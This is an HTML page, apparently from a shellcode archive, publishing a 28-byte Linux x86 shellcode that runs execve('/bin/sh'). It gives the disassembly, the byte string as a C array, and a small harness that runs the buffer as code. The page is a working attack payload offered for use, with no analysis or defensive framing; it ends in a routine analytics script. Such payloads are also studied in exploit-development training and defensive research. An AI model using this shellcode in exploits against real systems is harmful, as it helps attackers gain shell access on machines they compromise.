<html><head><title>Linux/x86 - execve(/bin/sh) - 28 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title:	Linux x86 execve(&quot;/bin/sh&quot;) - 28 bytes
Author:	Jean Pascal Pereira &lt;pereira@secbiz.de&gt;
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 &lt;_start&gt;:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80



*/

#include &lt;stdio.h&gt;

char shellcode[] = &quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;
                   &quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;
                   &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;
                   &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;;

int main()
{
  fprintf(stdout,&quot;Lenght: %d\n&quot;,strlen(shellcode));
  (*(void  (*)()) shellcode)();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
